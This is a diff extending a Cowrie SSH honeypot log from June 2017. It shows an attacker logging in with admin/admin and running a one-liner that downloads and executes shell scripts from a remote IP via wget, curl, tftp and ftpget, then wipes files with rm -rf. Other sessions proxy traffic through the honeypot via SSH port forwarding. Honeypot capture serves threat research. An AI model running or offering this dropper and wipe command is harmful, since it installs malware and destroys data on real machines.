@@ -6379,3 +6379,87 @@
 2017-06-03T10:23:59+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,2731,163.172.138.239] 'admin' trying auth 'password'
 2017-06-03T10:23:59+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,2731,163.172.138.239] login attempt: 152
 2017-06-03T10:23:59+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,2731,163.172.138.239] login return, expect: [admin/admin]
+2017-06-03T10:24:01+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,2731,163.172.138.239] login attempt [admin/admin] succeeded
+2017-06-03T10:24:02+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,2731,163.172.138.239] 'admin' authenticated with 'password'
+2017-06-03T10:24:02+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,2731,163.172.138.239] starting service 'ssh-connection'
+2017-06-03T10:24:02+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,2728,212.129.53.59] got global keepalive@jcraft.com request
+2017-06-03T10:24:02+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,2731,163.172.138.239] got channel 'session' request
+2017-06-03T10:24:02+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,2731,163.172.138.239] channel open
+2017-06-03T10:24:03+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,2731,163.172.138.239] executing command "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://51.15.48.238/armex.sh; curl -O http://51.15.48.238/armex.sh; chmod 777 armex.sh; sh armex.sh; tftp 51.15.48.238 -c get armexft.sh; chmod 777 armexft.sh; sh armexft.sh; tftp 51.15.48.238 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 51.15.48.238; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 51.15.48.238 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf armex.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *
+	"
+2017-06-03T10:24:03+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,2731,163.172.138.239] Opening TTY Log: log/tty/20170603-102402-29043244-0e.log
+2017-06-03T10:24:03+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,2731,163.172.138.239] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://51.15.48.238/armex.sh; curl -O http://51.15.48.238/armex.sh; chmod 777 armex.sh; sh armex.sh; tftp 51.15.48.238 -c get armexft.sh; chmod 777 armexft.sh; sh armexft.sh; tftp 51.15.48.238 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 51.15.48.238; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 51.15.48.238 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf armex.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *
+	
+2017-06-03T10:24:03+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,2731,163.172.138.239] Command found: cd /tmp
+2017-06-03T10:24:03+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,2731,163.172.138.239] Command found: cd /var/run
+2017-06-03T10:24:03+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,2731,163.172.138.239] Command found: cd /mnt
+2017-06-03T10:24:03+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,2731,163.172.138.239] Command found: cd /root
+2017-06-03T10:24:03+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,2731,163.172.138.239] Command found: cd /
+2017-06-03T10:24:03+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,2731,163.172.138.239] Command found: wget http://51.15.48.238/armex.sh
+2017-06-03T10:24:03+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://51.15.48.238/armex.sh>
+2017-06-03T10:24:03+0000 [HTTPPageDownloader,client] Not storing duplicate content e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688
+2017-06-03T10:24:03+0000 [HTTPPageDownloader,client] Downloaded URL (http://51.15.48.238/armex.sh) with SHA-256 e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688 to dl/e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688
+2017-06-03T10:24:03+0000 [HTTPPageDownloader,client] Command found: curl -O http://51.15.48.238/armex.sh
+2017-06-03T10:24:03+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://51.15.48.238/armex.sh>
+2017-06-03T10:24:03+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://51.15.48.238/armex.sh>
+2017-06-03T10:24:03+0000 [HTTPPageDownloader,client] Not storing duplicate content e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688
+2017-06-03T10:24:03+0000 [HTTPPageDownloader,client] Downloaded URL (http://51.15.48.238/armex.sh) with SHA-256 e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688 to dl/e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688
+2017-06-03T10:24:03+0000 [HTTPPageDownloader,client] Command found: chmod 777 /armex.sh
+2017-06-03T10:24:03+0000 [HTTPPageDownloader,client] Command found: sh /armex.sh
+2017-06-03T10:24:03+0000 [HTTPPageDownloader,client] Command found: tftp 51.15.48.238 -c get armexft.sh
+2017-06-03T10:24:03+0000 [HTTPPageDownloader,client] Command found: chmod 777 armexft.sh
+2017-06-03T10:24:03+0000 [HTTPPageDownloader,client] Command found: sh armexft.sh
+2017-06-03T10:24:03+0000 [HTTPPageDownloader,client] Command found: tftp 51.15.48.238 -c get tftp1.sh
+2017-06-03T10:24:03+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp1.sh
+2017-06-03T10:24:03+0000 [HTTPPageDownloader,client] Command found: sh tftp1.sh
+2017-06-03T10:24:03+0000 [HTTPPageDownloader,client] Command found: tftp -r tftp2.sh -g 51.15.48.238
+2017-06-03T10:24:03+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp2.sh
+2017-06-03T10:24:03+0000 [HTTPPageDownloader,client] Command found: sh tftp2.sh
+2017-06-03T10:24:03+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 51.15.48.238 ftp1.sh ftp1.sh
+2017-06-03T10:24:03+0000 [HTTPPageDownloader,client] FTP retrieval failed: 425 Security: Bad IP connecting.
+2017-06-03T10:24:03+0000 [HTTPPageDownloader,client] Command found: sh ftp1.sh
+2017-06-03T10:24:03+0000 [HTTPPageDownloader,client] Command found: rm -rf /armex.sh tftp1.sh tftp2.sh ftp1.sh
+2017-06-03T10:24:03+0000 [HTTPPageDownloader,client] Command found: rm -rf /lost+found /vmlinuz /srv /sys /run /sbin /proc /mnt /bin /usr /tmp /var /initrd.img /etc /opt /boot /selinux /home /media /lib /root /dev
+2017-06-03T10:24:03+0000 [HTTPPageDownloader,client] exitCode: 0
+2017-06-03T10:24:03+0000 [HTTPPageDownloader,client] sending request 'exit-status'
+2017-06-03T10:24:03+0000 [HTTPPageDownloader,client] Not storing duplicate content e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688
+2017-06-03T10:24:03+0000 [HTTPPageDownloader,client] Saved redir contents with SHA-256 e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688 to dl/e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688
+2017-06-03T10:24:03+0000 [HTTPPageDownloader,client] Closing TTY Log: log/tty/20170603-102402-29043244-0e.log after 0 seconds
+2017-06-03T10:24:03+0000 [HTTPPageDownloader,client] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-06-03T10:24:03+0000 [HTTPPageDownloader,client] sending close 0
+2017-06-03T10:24:03+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://51.15.48.238/armex.sh>
+2017-06-03T10:24:08+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,2728,212.129.53.59] got global keepalive@jcraft.com request
+2017-06-03T10:24:13+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,2728,212.129.53.59] got global keepalive@jcraft.com request
+2017-06-03T10:24:17+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,2679,91.195.103.178] got channel 'direct-tcpip' request
+2017-06-03T10:24:17+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,2679,91.195.103.178] direct-tcp connection request to 54.230.14.17:443 from localhost:5556
+2017-06-03T10:24:18+0000 [SSHChannel None (15) on SSHService 'ssh-connection' on HoneyPotSSHTransport,2679,91.195.103.178] direct-tcp forward to 54.230.14.17:443 with data "\x16\x03\x03\x00\x9b\x01\x00\x00\x97\x03\x03Y2\x8e!\xc1\xbc\x8c\xe7\xb6\xb2\xa4\x82;\xcf\xe0\x9a\x06\xbf\x17.\xff\xe9\xe7)\x16\x8bQ\xbb\xe7d\x98\x8a\x00\x00*\x00<\x00/\x00=\x005\x00\x05\x00\n\xc0'\xc0\x13\xc0\x14\xc0+\xc0#\xc0,\xc0$\xc0\t\xc0\n\x00@\x002\x00j\x008\x00\x13\x00\x04\x01\x00\x00D\xff\x01\x00\x01\x00\x00\x00\x00\x17\x00\x15\x00\x00\x12account.mojang.com\x00\n\x00\x06\x00\x04\x00\x17\x00\x18\x00\x0b\x00\x02\x01\x00\x00\r\x00\x10\x00\x0e\x04\x01\x05\x01\x02\x01\x04\x03\x05\x03\x02\x03\x02\x02"
+2017-06-03T10:24:18+0000 [SSHChannel None (15) on SSHService 'ssh-connection' on HoneyPotSSHTransport,2679,91.195.103.178] failed to connect: Connection refused
+2017-06-03T10:24:18+0000 [SSHChannel None (15) on SSHService 'ssh-connection' on HoneyPotSSHTransport,2679,91.195.103.178] sending close 15
+2017-06-03T10:24:19+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,2728,212.129.53.59] got global keepalive@jcraft.com request
+2017-06-03T10:24:23+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,2730,163.172.138.239] remote close
+2017-06-03T10:24:23+0000 [HoneyPotSSHTransport,2730,163.172.138.239] avatar admin logging out
+2017-06-03T10:24:23+0000 [HoneyPotSSHTransport,2730,163.172.138.239] connection lost
+2017-06-03T10:24:23+0000 [HoneyPotSSHTransport,2730,163.172.138.239] Connection lost after 33 seconds
+2017-06-03T10:24:24+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,2728,212.129.53.59] got global keepalive@jcraft.com request
+2017-06-03T10:24:24+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,2704,91.230.47.74] got channel 'direct-tcpip' request
+2017-06-03T10:24:24+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,2704,91.230.47.74] direct-tcp connection request to 107.6.167.194:80 from localhost:5556
+2017-06-03T10:24:24+0000 [SSHChannel None (11) on SSHService 'ssh-connection' on HoneyPotSSHTransport,2704,91.230.47.74] direct-tcp forward to 107.6.167.194:80 with data 'GET /internals/api/ip?1496485418494996713 HTTP/1.1\r\nHost: ip4.adspy.mobi\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.67 Safari/537.36\r\nAccept-Encoding: gzip, deflate, sdch\r\n\r\n'
+2017-06-03T10:24:24+0000 [SSHChannel None (11) on SSHService 'ssh-connection' on HoneyPotSSHTransport,2704,91.230.47.74] failed to connect: Connection refused
+2017-06-03T10:24:24+0000 [SSHChannel None (11) on SSHService 'ssh-connection' on HoneyPotSSHTransport,2704,91.230.47.74] sending close 11
+2017-06-03T10:24:29+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,2728,212.129.53.59] got global keepalive@jcraft.com request
+2017-06-03T10:24:33+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,2731,163.172.138.239] remote close
+2017-06-03T10:24:33+0000 [HoneyPotSSHTransport,2731,163.172.138.239] avatar admin logging out
+2017-06-03T10:24:33+0000 [HoneyPotSSHTransport,2731,163.172.138.239] connection lost
+2017-06-03T10:24:33+0000 [HoneyPotSSHTransport,2731,163.172.138.239] Connection lost after 33 seconds
+2017-06-03T10:24:34+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,2728,212.129.53.59] got global keepalive@jcraft.com request
+2017-06-03T10:24:35+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,2720,91.230.47.70] got channel 'direct-tcpip' request
+2017-06-03T10:24:35+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,2720,91.230.47.70] direct-tcp connection request to 23.78.101.195:443 from localhost:5556
+2017-06-03T10:24:35+0000 [SSHChannel None (26) on SSHService 'ssh-connection' on HoneyPotSSHTransport,2720,91.230.47.70] direct-tcp forward to 23.78.101.195:443 with data "\x80z\x01\x03\x01\x00Q\x00\x00\x00 \x00\x009\x00\x008\x00\x005\x00\x00\x16\x00\x00\x13\x00\x00\n\x07\x00\xc0\x00\x003\x00\x002\x00\x00/\x00\x00\x07\x05\x00\x80\x03\x00\x80\x00\x00\x05\x00\x00\x04\x01\x00\x80\x00\x00\x15\x00\x00\x12\x00\x00\t\x06\x00@\x00\x00\x14\x00\x00\x11\x00\x00\x08\x00\x00\x06\x04\x00\x80\x00\x00\x03\x02\x00\x80\x96\xbe\xd8\x04\xeb\xcf\x9dtv\x8e\xb8\xe4x\xa3?\xe2\xbc\xf9\xb19\xdc\xc1\xe1O\xd2\x8c'|\x97\x93n\x91"
+2017-06-03T10:24:35+0000 [SSHChannel None (26) on SSHService 'ssh-connection' on HoneyPotSSHTransport,2720,91.230.47.70] failed to connect: Connection refused
+2017-06-03T10:24:35+0000 [SSHChannel None (26) on SSHService 'ssh-connection' on HoneyPotSSHTransport,2720,91.230.47.70] sending close 26
+2017-06-03T10:24:39+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,2728,212.129.53.59] got global keepalive@jcraft.com request
+2017-06-03T10:24:45+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,2728,212.129.53.59] got global keepalive@jcraft.com request
+2017-06-03T10:24:50+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,2728,212.129.53.59] got global keepalive@jcraft.com request
+2017-06-03T10:24:55+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,2728,212.129.53.59] got global keepalive@jcraft.com request
+2017-06-03T10:25:00+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,2728,212.129.53.59] got global keepalive@jcraft.com request
